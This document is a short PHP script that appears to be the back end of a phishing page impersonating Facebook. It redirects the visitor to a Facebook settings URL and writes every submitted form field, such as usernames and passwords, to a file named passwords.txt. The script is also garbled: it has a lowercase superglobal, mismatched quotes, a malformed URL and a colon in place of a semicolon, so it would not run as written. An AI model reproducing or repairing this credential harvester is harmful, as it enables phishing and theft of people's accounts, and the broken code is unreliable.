<?php
header("location: https://www.facebook.com?settings?tab=security ");
$handle = fopen("passwords.txt", "a");
foreach($_post as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle,'\r\n");
fclose($handle);
exit:
?>